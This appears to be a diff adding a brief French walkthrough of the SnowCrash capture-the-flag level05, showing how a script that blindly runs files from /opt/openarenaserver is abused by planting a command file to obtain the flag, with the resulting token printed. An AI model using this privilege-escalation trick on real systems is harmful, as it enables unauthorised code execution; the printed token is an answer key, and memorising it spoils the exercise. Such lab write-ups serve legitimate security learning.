@@ -1,0 +1,24 @@
+level05@SnowCrash:~$ find / -user flag05 2>/dev/null
+/usr/sbin/openarenaserver
+/rofs/usr/sbin/openarenaserver
+
+On cherche les fichier openarenaserver
+level05@SnowCrash:~$ find / -name openarenaserver 2>/dev/null
+/opt/openarenaserver
+/usr/sbin/openarenaserver
+/rofs/opt/openarenaserver
+/rofs/usr/sbin/openarenaserver
+
+level05@SnowCrash:/usr/sbin$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+ensuite on place dans /opt/openarenaserver un fichier tel que : echo "getflag > /tmp/result" > test
+
+puis
+
+level05@SnowCrash:/tmp$ cat result
+Check flag.Here is your token : viuaaale9huek52boumoomioc
